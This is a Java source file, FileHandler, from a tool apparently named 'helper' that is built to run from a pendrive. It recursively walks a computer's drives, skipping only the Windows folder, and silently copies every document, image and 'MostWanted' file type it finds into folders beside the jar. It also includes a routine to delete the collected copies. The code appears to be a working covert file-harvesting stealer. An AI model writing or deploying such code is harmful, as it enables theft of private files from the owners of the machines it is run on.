package com.moss.helper.file;

import java.io.File;
import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.file.Files;

import com.moss.helper.Main;
import com.moss.helper.printer.Printer;
import com.moss.helper.utilities.Settings;
import com.moss.helper.utilities.Settings.DocumentExtensions;
import com.moss.helper.utilities.Settings.ImageExtensions;
import com.moss.helper.utilities.Settings.MostWanted;

import static com.moss.helper.utilities.Settings.dataDirectory;
import static com.moss.helper.utilities.Settings.documentsDirectory;
import static com.moss.helper.utilities.Settings.imagesDirectory;
import static com.moss.helper.utilities.Settings.mostWantedDirectory;

public class FileHandler {

    public static final File workingDirectory = getWorkingDirectory();

    private static File getWorkingDirectory() {
        String path = null;
        String filePath = null;
        File file = null;
        try {
            path = Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
        //System.out.println(path);
        if (path.endsWith("target/classes/")) {
            filePath = path.replace("target/classes/", "");
            //System.out.println("HDD mode!");
        }
        else if (path.endsWith("helper.jar")) {
            filePath = path.replace("helper.jar", "");
            //System.out.println("Pendrive mode!");
        }
        file = new File(filePath);
        if (Settings.logMode) {
            //System.out.println(file.toString());
            Printer.printOutputToFile(file.toString(), Settings.logFile);
        }
        return file;
    }

    // ------------------------------------------------------------------------------------------------------------------

    public static void findFile(String name, File directory) {
        File[] list = directory.listFiles();
        if (list != null)
            for (File file : list) {
                if (file.isDirectory()) {
                    findFile(name, file);
                } else if (name.equalsIgnoreCase(file.getName())) {
                    //System.out.println("Found file : " + file.getPath());
                    String copyFilePath = dataDirectory + "\\" + name;
                    File copyFile = new File(copyFilePath);
                    int copyNumber = 1;
                    while (copyFile.exists()) {
                        copyFile = new File(dataDirectory + "\\" + copyNumber + name);
                        copyNumber++;
                    }
                    copyFile(file, copyFile);
                }
            }
    }

    // ------------------------------------------------------------------------------------------------------------------

    public static void findFiles(File directory) {
        File[] list = directory.listFiles();
        if (list != null)
            for (File file : list) {
                String fileName = file.getName();
                if (file.isDirectory()) {
                    if (!fileName.equals("Windows")) {
                        findFiles(file);
                    }
                    else {
                    }
                } else if (isDocument(fileName) || isImage(fileName) || isMostWanted(fileName)) {
                    String destinationDirectoryPath = "";
                    if (isDocument(fileName)) {
                        destinationDirectoryPath = documentsDirectory + "\\";
                    }
                    else if (isImage(fileName)) {
                        destinationDirectoryPath = imagesDirectory + "\\";
                    }
                    else if (isMostWanted(fileName)) {
                        destinationDirectoryPath = mostWantedDirectory + "\\";
                    }
                    //System.out.println("Found file : " + file.getPath());
                    String copyFilePath = destinationDirectoryPath + fileName;
                    File copyFile = new File(copyFilePath);
                    int copyNumber = 1;
                    while (copyFile.exists()) {
                        copyFile = new File(destinationDirectoryPath + copyNumber + fileName);
                        copyNumber++;
                    }
                    copyFile(file, copyFile);
                }
            }
    }

    // ------------------------------------------------------------------------------------------------------------------

    private static void copyFile(File source, File destination) {
        try {
            Files.copy(source.toPath(), destination.toPath());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // ------------------------------------------------------------------------------------------------------------------

    private static boolean isDocument(String fileName) {
        for (DocumentExtensions extension : DocumentExtensions.values()) {
            String extensionString = extension.toString();
            if (fileName.endsWith(extensionString)) {
                return true;
            }
        }
        return false;
    }

    // ------------------------------------------------------------------------------------------------------------------

    private static boolean isImage(String fileName) {
        for (ImageExtensions extension : ImageExtensions.values()) {
            String extensionString = extension.toString();
            if (fileName.endsWith(extensionString)) {
                return true;
            }
        }
        return false;
    }

    // ------------------------------------------------------------------------------------------------------------------

    private static boolean isMostWanted(String fileName) {
        for (MostWanted extension : MostWanted.values()) {
            String extensionString = extension.toString();
            if (fileName.endsWith("." + extensionString)) {
                return true;
            }
        }
        return false;
    }

    // --------------------------------------------------------------------------------

    public static void removeFiles() {
        File docDirectory = new File(documentsDirectory);
        for (File file : docDirectory.listFiles())
            file.delete();
        File imgDirectory = new File(imagesDirectory);
        for (File file : imgDirectory.listFiles())
            file.delete();
        File mostWantDirectory = new File(mostWantedDirectory);
        for (File file : mostWantDirectory.listFiles())
            file.delete();
    }

}
